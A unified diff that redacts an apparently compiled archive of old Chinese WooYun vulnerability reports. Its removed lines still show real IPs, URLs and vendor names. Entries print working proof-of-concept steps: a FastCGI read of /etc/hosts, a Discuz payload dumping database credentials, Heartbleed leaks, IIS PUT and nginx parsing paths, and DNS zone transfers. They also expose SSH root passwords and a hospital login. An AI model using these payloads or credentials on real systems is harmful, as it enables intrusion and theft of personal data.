-**详情**: 以60.28.210.240为例，为huoyunren.com某个后台，其他ip都可以直接读取服务器中的文件数据liet@kali:~/code/exp/php/test$ ../fcgi_exp read 60.28.210.240 9000 /etc/hostsX-Powered-By: PHP/5.3.6Content-type: text/html127.0.0.1      localhost cre.huoyunren.com elt.huoyunren.com10.3.0.171     vm-logstorage-0110.3.0.172     vm-logstorage-0210.3.0.173     vm-logstorage-0310.3.0.174     vm-logcompute-0110.3.0.175     vm-logcompute-0210.3.0
+**详情**: 以60.28.210.240为例，为huoyunren.com某个后台，其他ip都可以直接读取服务器中的文件数据liet@kali:~/code/exp/php/test$ ../fcgi_exp read [IP已脱敏] 9000 /etc/hostsX-Powered-By: PHP/5.3.6Content-type: text/html127.0.0.1      localhost cre.huoyunren.com elt.huoyunren.com10.3.0.171     vm-logstorage-0110.3.0.172     vm-logstorage-0210.3.0.173     vm-logstorage-0310.3.0.174     vm-logcompute-0110.3.0.175     vm-logcompute-0210.3.0
 
-**POC**: liet@kali:~/code/exp/php/test$ ../fcgi_exp read 60.28.210.241 9000 /etc/hostsX-Powered-By: PHP/5.3.6Content-type: text/html127.0.0.1      localhost10.3.0.171     vm-logstorage-0110.3.0.172     vm-logstorage-0210.3.0.173     vm-logstorage-0310.3.0.174     vm-logcompute-0110.3.0.175     vm-logcompute-
+**POC**: liet@kali:~/code/exp/php/test$ ../fcgi_exp read [IP已脱敏] 9000 /etc/hostsX-Powered-By: PHP/5.3.6Content-type: text/html127.0.0.1      localhost10.3.0.171     vm-logstorage-0110.3.0.172     vm-logstorage-0210.3.0.173     vm-logstorage-0310.3.0.174     vm-logcompute-0110.3.0.175     vm-logcompute-
 
 **绕过**: 直接利用
 
@@ -11758,7 +11758,7 @@
 
 **详情**: 
 
-**POC**: http://mail.cntv.cn/images/btn_close.jpg/c.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11766,8 +11766,8 @@
 ---
 
 ---
-### [wooyun-2012-04174] 新浪分站少量信息泄漏
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-04174] 某社交平台分站少量信息泄漏
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -11780,7 +11780,7 @@
 
 **详情**: 少量信息泄漏及列目录，配置不当，不是什么严重问题
 
-**POC**: http://m.us.sina.com/news/http://m.us.sina.com/test.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11800,7 +11800,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.hakim.com.cn/wwwroot.rar
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -11822,9 +11822,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由于服务器禁用了短标签，导致php文件源码被下载。泄漏大量表结构等。。。http://house.people.com.cn/xinwen/chakanpinlun.php
+**详情**: 由于服务器禁用了短标签，导致php文件源码被下载。泄漏大量表结构等。。。https://example.com/[已脱敏]
 
-**POC**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>评论--<?=$id?></title><style type="text/css"><!--body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-b
+**POC**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""https://example.com/[已脱敏]"><html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>评论--<?=$id?></title><style type="text/css"><!--body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-b
 
 **绕过**: 直接利用
 
@@ -11846,7 +11846,7 @@
 
 **详情**: 以下设备未检查mmap操作的参数，导致用户能够修改任意内存，例如修改内核逻辑导致权限提升，或者拒绝服务。"/dev/camera-sysram",	// 666"/dev/camera-isp",		// 666"/dev/mt6573-SYSRAM",	// 666"/dev/mt6575-SYSRAM",	// 666"/dev/mt6575-isp",		// 666"/dev/camera-eis",		// 660
 
-**POC**: exploit下载地址：http://pan.baidu.com/share/link?shareid=394174&uk=4010037896测试过的机型：华为T8850。测试方法：adb push mtkcameragetroot /data/local/tmpadb shell chmod 755 /data/local/tmp/mtkcameragetrootadb shell$ /data/local/tmp/mtkcameragetroot...#
+**POC**: exploit下载地址：https://example.com/[已脱敏] push mtkcameragetroot /data/local/tmpadb shell chmod 755 /data/local/tmp/mtkcameragetrootadb shell$ /data/local/tmp/mtkcameragetroot...#
 
 **绕过**: 直接利用
 
@@ -11888,9 +11888,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IP：http://218.85.65.35/JBOSS：http://218.85.65.35:9081/jmx-console/abc.jspJBOSS:http://218.85.65.35:9081/web-console/
+**详情**: IP：http://[IP已脱敏]
 
-**POC**: IP：http://218.85.65.35/JBOSS：http://218.85.65.35:9081/jmx-console/abc.jspJBOSS:http://218.85.65.35:9081/web-console/
+**POC**: IP：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -11910,7 +11910,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://edm.feng.com/这个是威锋网的邮件群发系统在根目录下有个aaa.txt  http://edm.feng.com/aaa.txt这个txt文件不是固定的，而是随着邮件发送，不断变化。简单地说就是把发送邮件的记录写入到这里随时打开都能看到例如：INSERT INTO `mail_deliver_log_queue` (did,ip,msgid,code,email,cid,domain,mx,cmd,reason,is_retry,add_time) VALUES ('855785','162.209.149.40','3552','250','120727698@qq.com','1920847','delivery_tencent','mx1.qq.com','/www/client/sendEmail -f \\\"=?utf-8?B?5aiB6ZSL572R?
+**详情**: https://example.com/[已脱敏]  https://example.com/[已脱敏] INTO `mail_deliver_log_queue` (did,ip,msgid,code,email,cid,domain,mx,cmd,reason,is_retry,add_time) VALUES ('855785','[IP已脱敏]','3552','250','120727698@某互联网公司.com','1920847','delivery_tencent','mx1.某互联网公司.com','/www/client/sendEmail -f \\\"=?utf-8?B?5aiB6ZSL572R?
 
 **POC**: 会不断变化，定时抓取可导致严重信息泄露。
 
@@ -11932,7 +11932,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录页面http://fenlei.sogou.com/newhot/admin/login.jsp另外，该类机器的java进程貌似死掉，直接保留源码http://fenlei.sogou.com/admin/
+**详情**: 登录页面https://example.com/[已脱敏]
 
 **POC**: 截取部分源码<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%> <% response.setHeader("Pragma","No-cache"); response.setHeader("Cache-Control","no-cache"); response.setDateHeader("Expires", 0); %> <%@ page import="com.sogou.nav.hot.bean.SetUvItem"%> <%@ page import="com.
 
@@ -11954,7 +11954,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: python svn.py http://passport.wanglibao.com/
+**详情**: python svn.py https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -11976,9 +11976,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://e.shengjing360.com/elogin/toLogin登录接口访问http://learn.shengjing360.com/kbms/toPreview.action?type=N&doctype=D&docid=4523&from_sso=Y&userid=6561&ticket=0c7405d7e2eaebb155b74aaa4e646bfe直接不规则绕过可以评论随便写入1docid=这个没有加密，可以替换，获得其他录音文件可以依次下载估计上万，呵呵
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://learn.shengjing360.com/kbms/toPreview.action?type=N&doctype=D&docid=4523&from_sso=Y&userid=6561&ticket=0c7405d7e2eaebb155b74aaa4e646bfe
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -11998,9 +11998,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 权限配置问题造成http://www.joyoung.com.cn/WEB-INF/该目录下所有文件可以直接读取。
+**详情**: 权限配置问题造成https://example.com/[已脱敏]
 
-**POC**: http://www.joyoung.com.cn/WEB-INF/web.xmlhttp://www.joyoung.com.cn/WEB-INF/struts/struts.xml第二个文件中有个include信息：<include file="../struts/struts_sys.xml"/><include file="../struts/struts_series.xml"/><include file="../struts/struts_cuisine.xml"/>......这些也都是可以读的。其他文件可以根据经验进行猜测，或者写个脚本进行遍历。
+**POC**: https://example.com/[已脱敏] file="../struts/struts_sys.xml"/><include file="../struts/struts_series.xml"/><include file="../struts/struts_cuisine.xml"/>......这些也都是可以读的。其他文件可以根据经验进行猜测，或者写个脚本进行遍历。
 
 **绕过**: 直接利用
 
@@ -12008,8 +12008,8 @@
 ---
 
 ---
-### [wooyun-2013-022621] 百度之星在线编译系统漏洞，可以执行任意代码
-**厂商**: 百度 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-022621] 某搜索引擎之星在线编译系统漏洞，可以执行任意代码
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -12042,9 +12042,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 邮件系统：http://mail.wanda.cn/
+**详情**: 邮件系统：https://example.com/[已脱敏]
 
-**POC**: 貌似还有大量历史用户名等记录信息暴露：http://mail.wanda.cn/report/貌似数据库端口都是对外的，不过有策略维护：http://mail.wanda.cn/include/config.inc
+**POC**: 貌似还有大量历史用户名等记录信息暴露：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12064,7 +12064,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://110.90.115.45/福清市网上备案系统http://110.90.115.45/test.txt
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -12110,7 +12110,7 @@
 
 **详情**: 通过Google搜索“site:rayli.com.cn inurl:.php db host”，显示多个网站源码文件，可能为网站改版或搞活动后残存的文件，没有删除。而在访问这些PHP文件时，服务器又没按PHP程序来运行，而是直接返回该文件的内容。
 
-**POC**: 此文件的MySQL数据库账户可连接上去。http://www.rayli.com.cn/mini/party2011/php/config.inc.php
+**POC**: 此文件的MySQL数据库账户可连接上去。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12130,9 +12130,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://dh.wap.sohu.com/messageview.php?id=323
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://dh.wap.sohu.com/messageview.php?id=323
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12174,7 +12174,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一、江苏省苏州市信访局官网存在IIS PUT漏洞截止本人提交时首页还未恢复（已被国外黑客涂鸦）网址http://www.xfj.suzhou.gov.cn测试地址http://www.xfj.suzhou.gov.cn/1937cN.txt可提权控制服务器二、湖南省娄底水府示范片万宝新区管理委员会官网存在IIS PUT漏洞网址http://wbxq.gov.cn测试地址http://wbxq.gov.cn/1937cN.txt三、河南省驻马店市统战网，旅游局等多家政府网沦陷漏洞网站http://xxgk.zhumadian.gov.cn存在IIS PUT漏洞测试地址http://xxgk.zhumadian.gov.cn/1937cN.txt四、甘肃省张掖市人民政府网存在IIS PUT漏洞网址http://oa.zhangye.gov.cn测试地址http://oa.zhangye.gov
+**详情**: 一、江苏省苏州市信访局官网存在IIS PUT漏洞截止本人提交时首页还未恢复（已被国外黑客涂鸦）网址https://example.com/[已脱敏] PUT漏洞网址https://example.com/[已脱敏] PUT漏洞测试地址https://example.com/[已脱敏] PUT漏洞网址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12196,7 +12196,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 影响网站：http://forum.meizu.com/Disucz ucenter 用户将近1000万mask 区域*****^^^*****1.http://**.**.**/dzvul/sodb/19/sodb-2010-01.txt
+**详情**: 影响网站：https://example.com/[已脱敏] ucenter 用户将近1000万mask 区域*****^^^*****1.http://**.**.**/dzvul/sodb/19/sodb-2010-01.txt
 
 **POC**: cmd=echo readfile('./config.inc.php');<?php//UTF8转码/*[Discuz!] (C)2001-2006 Comsenz Inc.This is NOT a freeware, use is subject to license terms$RCSfile: config5.inc.php,v $$Revision: 1.9 $$Date: 2007/01/26 01:11:32 $*/// [CH] 以下变量请根据空间商提供的账号参数修改,如有疑问,请联系服务器提供商$dbhost = '192.168.**.**';			// 数据库服务器$d
 
@@ -12264,7 +12264,7 @@
 
 **详情**: nslookup -type=ns ydsc.com.cndig @dns1.ydsc.com.cn axfr ydsc.com.cn
 
-**POC**: ydsc.com.cn.		86400	IN	SOA	WEB-DNS01.ydsc.com.cn. root.ydsc.com.cn. 2009073101 28800 14400 3600000 86400ydsc.com.cn.		86400	IN	NS	dns1.ydsc.com.cn.ydsc.com.cn.		86400	IN	NS	dns2.ydsc.com.cn.ydsc.com.cn.		86400	IN	MX	10 mail.ydsc.com.cn.bgbg.ydsc.com.cn.	86400	IN	A	121.15.7.61dl.ydsc.com.cn.		86400	I
+**POC**: ydsc.com.cn.		86400	IN	SOA	WEB-DNS01.ydsc.com.cn. root.ydsc.com.cn. 2009073101 28800 14400 3600000 86400ydsc.com.cn.		86400	IN	NS	dns1.ydsc.com.cn.ydsc.com.cn.		86400	IN	NS	dns2.ydsc.com.cn.ydsc.com.cn.		86400	IN	MX	10 mail.ydsc.com.cn.bgbg.ydsc.com.cn.	86400	IN	A	[IP已脱敏]dl.ydsc.com.cn.		86400	I
 
 **绕过**: 直接利用
 
@@ -12306,7 +12306,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ip地址：211.97.0.84直接访问此地址将看到用户名和密码默认就已经填写好，用户名为nurse2测试过程中使用nurse1也是可以登录的。直接点击登录即可进入到管理系统，并可直接查看用户的个人信息（身份证，电话等）。还可以直接操作病人的病历。
+**详情**: ip地址：[IP已脱敏]直接访问此地址将看到用户名和密码默认就已经填写好，用户名为nurse2测试过程中使用nurse1也是可以登录的。直接点击登录即可进入到管理系统，并可直接查看用户的个人信息（身份证，电话等）。还可以直接操作病人的病历。
 
 **POC**: 实在是不知道这是哪个医院的系统。交给cert来找可能会更快。
 
@@ -12328,13 +12328,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: > set type=ns> tootoo.cn服务器:  xd-cache-1.bjtelecom.netAddress:  219.141.136.10非权威应答:tootoo.cn       nameserver = ns0.whois-inc.nettootoo.cn       nameserver = ns.whois-inc.netns.whois-inc.net        internet address = 124.42.15.8ns0.whois-inc.net       internet address = 119.254.17.> server ns0.whois-inc.netDNS request timed out.timeout was 2 seconds.DNS request timed out.timeout was 2 seconds.默认服
+**详情**: > set type=ns> tootoo.cn服务器:  xd-cache-1.bjtelecom.netAddress:  [IP已脱敏]非权威应答:tootoo.cn       nameserver = ns0.whois-inc.nettootoo.cn       nameserver = ns.whois-inc.netns.whois-inc.net        internet address = [IP已脱敏]ns0.whois-inc.net       internet address = 119.254.17.> server ns0.whois-inc.netDNS request timed out.timeout was 2 seconds.DNS request timed out.timeout was 2 seconds.默认服
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复请参考http://www.myhack58.com/Article/html/3/62/2013/38149_2.htm
+**修复**: 修复请参考https://example.com/[已脱敏]
 ---
 
 ---
@@ -12350,9 +12350,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://125.39.72.160/我就放一台吧...还有很多台...没有记录下来...
+**详情**: http://[IP已脱敏]
 
-**POC**: http://125.39.72.160/
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -12374,7 +12374,7 @@
 
 **详情**: 就是泄漏了，妥妥的
 
-**POC**: http://lol.tgbus.com/db/gw_s3/10.shtml
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12416,7 +12416,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: $rsync -r 183.60.7.111::nginxlogweb_loglog_for_splunkwebphp_backuphttp_nginx_logrsync 183.60.7.111::webphp_backupdrwxr-xr-x        4096 2010/09/08 14:14:03 .drwxr-xr-x       20480 2010/09/14 18:02:00 backupdrwxrwxr-x        4096 2009/04/24 11:48:53 htmldrwxr-xr-x        4096 2010/05/26 16:37:07 release_bindrwxrwxr-x        4096 2009/04/24 11:46:31 service.500wan.comrsync 183.60.7.111::webphp_backu
+**详情**: $rsync -r [IP已脱敏]::nginxlogweb_loglog_for_splunkwebphp_backuphttp_nginx_logrsync [IP已脱敏]::webphp_backupdrwxr-xr-x        4096 2010/09/08 14:14:03 .drwxr-xr-x       20480 2010/09/14 18:02:00 backupdrwxrwxr-x        4096 2009/04/24 11:48:53 htmldrwxr-xr-x        4096 2010/05/26 16:37:07 release_bindrwxrwxr-x        4096 2009/04/24 11:46:31 service.500wan.comrsync [IP已脱敏]::webphp_backu
 
 **POC**: (见原文)
 
@@ -12438,7 +12438,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 接入中继器提供的开放式WiFi网络后，可连接飞行器WiFi模块，IP地址为192.168.1.1，SSH的登陆信息为root/19881209。此外：中继器IP：192.168.1.2， SSH的登陆信息为root/19881209摄像头IP：192.168.1.10，SSH的登陆信息为root/123456
+**详情**: 接入中继器提供的开放式WiFi网络后，可连接飞行器WiFi模块，IP地址为192.168.1.1，SSH的登陆信息为root/19881209。此外：中继器IP：[IP已脱敏]， SSH的登陆信息为root/19881209摄像头IP：[IP已脱敏]，SSH的登陆信息为root/123456
 
 **POC**: 直接登陆
 
@@ -12460,9 +12460,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://m.secoo.com/http://iphone.secoo.com/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: [*] 124.251.59.104:443 - Sending Heartbeat...[*] 124.251.59.104:443 - Heartbeat response, 18975 bytes[+] 124.251.59.104:443 - Heartbeat response with leak[*] 124.251.59.104:443 - Printable info leaked: UD_[<+~*lF:}}f"!98532ED/A3t7.36Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Co
+**POC**: [*] [IP已脱敏] - Sending Heartbeat...[*] [IP已脱敏] - Heartbeat response, 18975 bytes[+] [IP已脱敏] - Heartbeat response with leak[*] [IP已脱敏] - Printable info leaked: UD_[<+~*lF:}}f"!98532ED/A3t7.36Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Co
 
 **绕过**: 直接利用
 
@@ -12470,8 +12470,8 @@
 ---
 
 ---
-### [wooyun-2015-0114708] 一种可大规模定向钓鱼携程旅游网千万用户的攻击过程重放（附案例，非携程用户依然躺枪）
-**厂商**: 携程旅行网 | **年份**: 2015 | **类型**: 应用配置错误
+### [wooyun-2015-0114708] 一种可大规模定向钓鱼某旅游平台旅游网千万用户的攻击过程重放（附案例，非某旅游平台用户依然躺枪）
+**厂商**: 某旅游平台旅行网 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -12482,7 +12482,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这两天在外面旅游又用起来携程订酒店，偶然看到这样一个功能可以给自己的邮箱发送一封自己的行程邮件，点开后默认的邮箱是自己账户绑定的邮箱，也可以自行修改为其他任意邮箱来看一下邮件的内容，如果我们能控制页面输出变量的话，那么可以引发一场定向的钓鱼攻击邮箱都是支持html标记的，那么抓包来看一下,变量中所能控制的POST /Customer-API-Online/Ajax/AjaxMailJourney.aspx HTTP/1.1Host: my.ctrip.comProxy-Connection: keep-aliveContent-Length: 118Cache-Control: max-age=0Origin: http://my.ctrip.comIf-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMTUser-Agent: Mozilla/5.0
+**详情**: 这两天在外面旅游又用起来某旅游平台订酒店，偶然看到这样一个功能可以给自己的邮箱发送一封自己的行程邮件，点开后默认的邮箱是自己账户绑定的邮箱，也可以自行修改为其他任意邮箱来看一下邮件的内容，如果我们能控制页面输出变量的话，那么可以引发一场定向的钓鱼攻击邮箱都是支持html标记的，那么抓包来看一下,变量中所能控制的POST /Customer-API-Online/Ajax/AjaxMailJourney.aspx HTTP/1.1Host: my.ctrip.comProxy-Connection: keep-aliveContent-Length: 118Cache-Control: max-age=0Origin: https://example.com/[已脱敏] Thu, 01 Jan 1970 00:00:00 GMTUser-Agent: Mozilla/5.0
 
 **POC**: (见原文)
 
@@ -12504,9 +12504,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: nginx文件类型错误解析漏洞,参考 http://www.80sec.com/nginx-securit.html ：）
+**详情**: nginx文件类型错误解析漏洞,参考 https://example.com/[已脱敏] ：）
 
-**POC**: http://blog.happigo.com/wp-content/uploads/2011/04/blog_logo.png/x.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12526,7 +12526,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 甘肃省建设稽查执法局http://www.gsjzsc.com.cn/http://www.gsjzsc.com.cn/test.txt
+**详情**: 甘肃省建设稽查执法局https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12536,8 +12536,8 @@
 ---
 
 ---
-### [wooyun-2015-0119284] 携程旅游网邮件服务器可开启Origin模式绕过验证码撞库/躺枪vpn
-**厂商**: 携程旅行网 | **年份**: 2015 | **类型**: 应用配置错误
+### [wooyun-2015-0119284] 某旅游平台旅游网邮件服务器可开启Origin模式绕过验证码撞库/躺枪vpn
+**厂商**: 某旅游平台旅行网 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -12548,7 +12548,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://webmail.ctrip.com/CookieAuth.dll?GetLogon?curl=Z2F&formdir=1&reason=0以下是开启Origin模式：https://webmail.ctrip.com/CookieAuth.dll?GetLogon?curl=Z2F&reason=0&formdir=3https://webmail.ctrip.com/CookieAuth.dll?GetLogon?curl=Z2F&reason=0&formdir=4https://webmail.ctrip.com/CookieAuth.dll?GetLogon?curl=Z2F&reason=0&formdir=5均绕过验证码限制https://vpn.ctrip.com/prx/000/http/localhost/login   VPN系统和邮件系统的关系你们比我
+**详情**: https://example.com/[已脱敏]   VPN系统和邮件系统的关系你们比我
 
 **POC**: .
 
@@ -12570,7 +12570,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 邮箱服务器设置不当，没有开启验证，可以伪造发件人.影响企业内部信息安全.写了两个脚本对wooyun上的厂商跑了一遍.下面的脚本是跑出所有厂商的邮箱服务器域名或者IP.#!/usr/local/bin/python# -*- coding: utf8 -*-import timeimport dns.resolverfrom multiprocessing import Processimport osOK=[]ERROR=[]WHITE=["GOOGLEMAIL.COM","GOOGLE.COM","googlemail.com","qq.com","google.com","163.com","126.com"]def white(s):for w in WHITE:if w in s:return Falsereturn Truedef q(ym):try:if ym.startswi
+**详情**: 邮箱服务器设置不当，没有开启验证，可以伪造发件人.影响企业内部信息安全.写了两个脚本对wooyun上的厂商跑了一遍.下面的脚本是跑出所有厂商的邮箱服务器域名或者IP.#!/usr/local/bin/python# -*- coding: utf8 -*-import timeimport dns.resolverfrom multiprocessing import Processimport osOK=[]ERROR=[]WHITE=["GOOGLEMAIL.COM","GOOGLE.COM","googlemail.com","某互联网公司.com","google.com","163.com","126.com"]def white(s):for w in WHITE:if w in s:return Falsereturn Truedef q(ym):try:if ym.startswi
 
 **POC**: mail.taomee.commail.syyx.commx2.ctrip.commail.iboxpay.commailgateway.jiayuan.comtfw.qihoo.netmgw1.wanda.cnmx2.mail.renren.commx2.mail.renren.commx.ctrip.commail.51greenorange.commx2.ctrip.commail.ku6.commailgate2.neusoft.comstaff.178.commail03.meituan.commail.591wed.commgw2.wanda.cnmx1.huawei.commai
 
@@ -12592,7 +12592,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 同样的错误：WooYun: 好孩子某严重漏洞应该好好检查上线的产品，定期维护检查。JBoss控制台存在严重安漏洞，允许用户上传安装war脚本程序包。关于此漏洞请参考：http://tech.ccidnet.com/art/1099/20100111/1977341_1.htmlhttp://down.goodbaby.com/admin-console/login.seam?conversationId=15adminadmin
+**详情**: 同样的错误：WooYun: 好孩子某严重漏洞应该好好检查上线的产品，定期维护检查。JBoss控制台存在严重安漏洞，允许用户上传安装war脚本程序包。关于此漏洞请参考：https://example.com/[已脱敏]
 
 **POC**: 修复方案：给jmx-console加上访问密码1.在 ${jboss.server.home.dir}/deploy下面找到jmx-console.war目录编辑WEB-INF/web.xml文件 去掉 security-constraint 块的注释，使其起作用2.编辑WEB-INF/classes/jmx-console-users.properties或server/default/conf /props/jmx-console-users.properties (version >=4.0.2)和 WEB-INF/classes/jmx-console-roles.properties
 
@@ -12638,7 +12638,7 @@
 
 **详情**: 总的来说都是因为一个问题：没有做混淆，可以直接反编译出源码惹的祸！目前只分析了用户资产的密码加密方式，后续再看看其他方面的东西。
 
-**POC**: 先看反编译lib目录下的tsocserver.jar和tsocserver-pages.jar上图明显可以看出，完全没有做过混淆之类的。稍微翻一下就发现了加解密相关的部分代码：CryptoTool类里面包含有加密、解密的算法（这里就不截图那部分了，顺便也把加密相关的密钥屏蔽了下）结合上次的漏洞连接到数据库（见http://wooyun.org/bugs/wooyun-2015-0114875 ，呵呵，结合利用一下，呵呵，免得说危害不大各种呵呵）数据库里面包含有如下的表（cvs_asset_ext）表内容如下，包含加密的密码密码是经过某对称算法加密后进行了base64编码的。解密此base64的
+**POC**: 先看反编译lib目录下的tsocserver.jar和tsocserver-pages.jar上图明显可以看出，完全没有做过混淆之类的。稍微翻一下就发现了加解密相关的部分代码：CryptoTool类里面包含有加密、解密的算法（这里就不截图那部分了，顺便也把加密相关的密钥屏蔽了下）结合上次的漏洞连接到数据库（见https://example.com/[已脱敏] ，呵呵，结合利用一下，呵呵，免得说危害不大各种呵呵）数据库里面包含有如下的表（cvs_asset_ext）表内容如下，包含加密的密码密码是经过某对称算法加密后进行了base64编码的。解密此base64的
 
 **绕过**: 直接利用
 
@@ -12658,7 +12658,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://uc.pipi.cn/data/avatar/011/14/10/08_avatar_small.jpg/1.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12668,8 +12668,8 @@
 ---
 
 ---
-### [wooyun-2015-0130987] 中国联通运维配置不当导致上海交通银行网络Top线路/资源信息爆光
-**厂商**: 中国联通 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0130987] 某运营商运维配置不当导致上海交通银行网络Top线路/资源信息爆光
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -12680,7 +12680,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国联通运维配置不当导致上海交通银行网络Top线路&各种银行网关信息资源爆光惨不忍睹,到这里也不敢继续看下去了.能提高点安全意识么.各位不要以身试法.乌云帮我打个码吧...
+**详情**: 某运营商运维配置不当导致上海交通银行网络Top线路&各种银行网关信息资源爆光惨不忍睹,到这里也不敢继续看下去了.能提高点安全意识么.各位不要以身试法.乌云帮我打个码吧...
 
 **POC**: (见原文)
 
@@ -12702,7 +12702,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 蜡笔网网站首页地址: www.labi.com主办单位名称:北京格致璞科技有限公司蛮出名的手机同步   DNS域传送漏洞一枚C:\Documents and Settings\Administrator>nslookupDefault Server:  hb-cache1Address:  61.234.145.101> set type=ns> labi.comServer:  hb-cache1Address:  61.234.145.101Non-authoritative answer:labi.com        nameserver = ns.gozap.comlabi.com        nameserver = sns.gozap.com> server sns.gozap.comDefault Server:  sns.gozap.comAddress:  58.68
+**详情**: 蜡笔网网站首页地址: www.labi.com主办单位名称:北京格致璞科技有限公司蛮出名的手机同步   DNS域传送漏洞一枚C:\Documents and Settings\Administrator>nslookupDefault Server:  hb-cache1Address:  [IP已脱敏]> set type=ns> labi.comServer:  hb-cache1Address:  [IP已脱敏]Non-authoritative answer:labi.com        nameserver = ns.gozap.comlabi.com        nameserver = sns.gozap.com> server sns.gozap.comDefault Server:  sns.gozap.comAddress:  58.68
 
 **POC**: 如上
 
@@ -12712,8 +12712,8 @@
 ---
 
 ---
-### [wooyun-2012-06956] 腾讯应用之金字塔之谜后台两枚
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-06956] 某互联网公司应用之金字塔之谜后台两枚
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -12726,7 +12726,7 @@
 
 **详情**: 允许列目录
 
-**POC**: http://app34307.qzone.qzoneapp.com/admin/后台两枚：http://app34307.qzone.qzoneapp.com/admin/freeGiftByURL.jsphttp://app34307.qzone.qzoneapp.com/AJYHSendMessage.jsp配置文件一枚：http://app34307.qzone.qzoneapp.com/nginx.conf
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12746,7 +12746,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 昨天LZ路过一条街，发现街上有站街女，其中有一个竟然朝着我热情地打招呼：“帅哥，来玩玩吧。”我灵机一动，粗着嗓子说：“不了，我喜欢男的。”于是她看都懒得再看我一眼，我洋洋得意，头也不回的走了。结果还没走出路口，就被两个男的拦住了...121.14.5.208
